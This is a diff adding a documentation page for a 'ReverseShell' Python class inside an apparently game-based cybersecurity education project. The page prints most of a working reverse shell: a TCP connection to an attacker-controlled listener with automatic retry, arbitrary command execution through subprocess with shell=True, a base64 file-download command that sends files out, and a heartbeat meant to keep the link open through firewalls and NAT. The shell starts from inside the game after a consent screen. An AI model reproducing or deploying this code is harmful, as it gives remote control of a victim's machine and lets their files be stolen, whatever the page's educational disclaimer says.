@@ -1,0 +1,242 @@
+---
+title: 'Network Shell'
+description: 'ReverseShell class: TCP connection, command execution, platform aliases, file download protocol, and heartbeat.'
+keywords: ['reverse shell', 'network', 'socket', 'command execution', 'heartbeat', 'download']
+---
+
+# Network Shell
+
+`cyber_modules/network_shell.py` implements `ReverseShell`, a TCP reverse shell that connects to a remote listener, executes shell commands, and maintains the connection with a periodic heartbeat. It runs on a background daemon thread so the game UI remains responsive.
+
+<Warning>
+  This module is provided for **cybersecurity education only**. Use it exclusively in isolated lab environments (virtual machines, sandboxed networks) where you have explicit permission.
+</Warning>
+
+---
+
+## `ReverseShell` class
+
+```python
+class ReverseShell:
+    def __init__(self, host: str = "127.0.0.1", port: int = 5050) -> None
+    def start(self) -> None
+    def stop(self) -> None
+    def _connect_and_shell(self) -> None
+    def _heartbeat(self) -> None
+```
+
+### Attributes
+
+| Attribute | Type | Default | Description |
+|---|---|---|---|
+| `host` | `str` | `"127.0.0.1"` | IP address of the remote listener. Overridden by `--host` CLI flag. |
+| `port` | `int` | `5050` | TCP port of the listener. |
+| `connected` | `bool` | `False` | `True` while the socket is active and sending/receiving. |
+| `status` | `str` | `"IDLE"` | Human-readable connection state string. Read by the game HUD in Level 2. |
+| `sock` | `socket.socket \| None` | `None` | The active TCP socket, or `None` when not connected. |
+| `thread` | `threading.Thread \| None` | `None` | Daemon thread running `_connect_and_shell`. |
+| `_stop_event` | `threading.Event` | (unset) | Used to signal the connection loop to exit cleanly. |
+| `MAPPED_COMMANDS` | `dict` | Platform-dependent | Unix-to-Windows command aliases. Empty on Linux/macOS. |
+
+### Status values
+
+| Value | Meaning |
+|---|---|
+| `"IDLE"` | Shell created but `start()` not yet called. |
+| `"CONNECTING TO {host}..."` | Attempting TCP connection. |
+| `"CONNECTED TO {host}"` | Socket established, shell loop active. |
+| `"RETRYING: {err}..."` | Connection failed; waiting 2 s before retry. Error message truncated to 20 chars. |
+
+---
+
+## `__init__(host, port)`
+
+<ParamField path="host" type="str" default="127.0.0.1">
+  IP address of the attacker-controlled listener. The game passes `args.host` here.
+</ParamField>
+
+<ParamField path="port" type="int" default="5050">
+  TCP port to connect to.
+</ParamField>
+
+On Windows (`sys.platform == "win32"`), `MAPPED_COMMANDS` is populated with Unix-to-CMD aliases so operators can use familiar Unix commands:
+
+```python
+self.MAPPED_COMMANDS = {
+    "ls":      "dir",
+    "pwd":     "echo %cd%",
+    "clear":   "cls",
+    "ifconfig": "ipconfig",
+    "cat":     "type",
+    "grep":    "findstr",
+}
+```
+
+On Linux and macOS, `MAPPED_COMMANDS` is an empty dict — native commands are used directly.
+
+---
+
+## `start()`
+
+Launches `_connect_and_shell` on a new daemon thread if no thread is currently alive.
+
+```python
+def start(self) -> None:
+    if not self.thread or not self.thread.is_alive():
+        self._stop_event.clear()
+        self.thread = threading.Thread(
+            target=self._connect_and_shell, daemon=True
+        )
+        self.thread.start()
+```
+
+Calling `start()` multiple times is safe — a new thread is only created if the previous one has exited.
+
+In the game, `start()` is called immediately after the player accepts the consent screen:
+
+```python
+shell.start()   # in main_game.py, after show_consent_screen() returns True
+```
+
+---
+
+## `stop()`
+
+Signals the connection loop to exit and closes the socket.
+
+```python
+def stop(self) -> None:
+    self._stop_event.set()
+    self.connected = False
+    if self.sock:
+        self.sock.close()
+```
+
+<Note>
+  `stop()` does not join the thread. The daemon thread will terminate automatically when the main process exits.
+</Note>
+
+---
+
+## `_connect_and_shell()`
+
+The core connection and command-execution loop. Runs on the background thread started by `start()`, or in the foreground when `--bg` mode is active.
+
+### Connection phase
+
+```python
+self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+self.sock.settimeout(5.0)       # connect timeout
+self.sock.connect((self.host, self.port))
+self.sock.settimeout(None)      # blocking recv after connect
+```
+
+On success:
+1. `connected` is set to `True`.
+2. `status` is set to `"CONNECTED TO {host}"`.
+3. A heartbeat daemon thread is started.
+4. An initial greeting with the current working directory is sent.
+
+On failure, `status` is updated to `"RETRYING: {err[:20]}..."` and the loop sleeps for 2 seconds before retrying.
+
+### Command handling
+
+All commands are received as UTF-8 text in a 4096-byte buffer. The loop processes three built-in commands before falling through to subprocess execution:
+
+<Tabs>
+  <Tab title="cd">
+    Stateful directory change using `os.chdir()`:
+    ```python
+    if data.lower().startswith("cd "):
+        path = data[3:].strip()
+        os.chdir(os.path.expanduser(path))
+        response = f"[DIRECTORY CHANGED] -> {os.getcwd()}\n"
+        self.sock.send(response.encode("utf-8"))
+    ```
+    `os.path.expanduser()` handles `~` expansion. Errors are sent back as `"CD Error: {msg}\n"`.
+  </Tab>
+  <Tab title="download">
+    Reads a file from the current directory and sends it base64-encoded:
+    ```python
+    if data.lower().startswith("download "):
+        filename = data[9:].strip()
+        file_path = os.path.join(os.getcwd(), filename)
+        with open(file_path, "rb") as f:
+            encoded = base64.b64encode(f.read()).decode("utf-8")
+        self.sock.send(
+            f"[FILE_BEGIN:{filename}]{encoded}[FILE_END]\n".encode("utf-8")
+        )
+    ```
+    The listener can extract the content between `[FILE_BEGIN:name]` and `[FILE_END]` and base64-decode it to reconstruct the file.
+  </Tab>
+  <Tab title="Shell commands">
+    All other commands are executed via `subprocess.Popen` with `shell=True`:
+    ```python
+    proc = subprocess.Popen(
+        data, shell=True,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        stdin=subprocess.PIPE,
+        cwd=os.getcwd()
+    )
+    stdout, stderr = proc.communicate()
+    output = stdout + stderr
+    if not output:
+        output = b"[Done]\n"
+    context_tag = f"\n[PATH: {os.getcwd()}]\n"
+    self.sock.send(output + context_tag.encode("utf-8"))
+    ```
+    Every response appends a `[PATH: {cwd}]` tag so the operator always knows the current working directory.
+  </Tab>
+</Tabs>
+
+### Special built-in commands
+
+| Command | Behaviour |
+|---|---|
+| `ping` | Responds with `b"pong\n"` immediately, no subprocess. |
+| `quit` | Breaks the inner receive loop, triggering reconnection. |
+
+### Platform command aliases
+
+Before subprocess execution, the command base word is looked up in `MAPPED_COMMANDS`. If matched, the entire command string is rewritten:
+
+```python
+parts    = data.split()
+cmd_base = parts[0].lower()
+if cmd_base in self.MAPPED_COMMANDS:
+    data = self.MAPPED_COMMANDS[cmd_base] + " " + " ".join(parts[1:])
+    data = data.strip()
+```
+
+---
+
+## `_heartbeat()`
+
+Sends a keep-alive packet every 15 seconds to prevent the TCP connection from being dropped by firewalls or NAT devices.
+
+```python
+def _heartbeat(self) -> None:
+    while self.connected:
+        try:
+            self.sock.send(b"[HEARTBEAT]\n")
+            time.sleep(15)
+        except:
+            self.connected = False
+            break
+```
+
+Runs on its own daemon thread launched inside `_connect_and_shell` on successful connection. If the send fails (broken pipe, closed socket), `connected` is set to `False` and the heartbeat thread exits, allowing `_connect_and_shell` to detect the disconnection and retry.
+
+---
+
+## Protocol summary
+
+| Direction | Content |
+|---|---|
+| Client → Server (on connect) | `[SYSTEM] Secure Shell Active. Current Path: {cwd}\n` |
+| Client → Server (heartbeat) | `[HEARTBEAT]\n` every 15 s |
+| Server → Client (command) | UTF-8 shell command string, max 4096 bytes per recv |
+| Client → Server (response) | Command stdout + stderr + `\n[PATH: {cwd}]\n` |
+| Client → Server (file) | `[FILE_BEGIN:{name}]{base64_content}[FILE_END]\n` |
+| Client → Server (cd ack) | `[DIRECTORY CHANGED] -> {new_path}\n` |
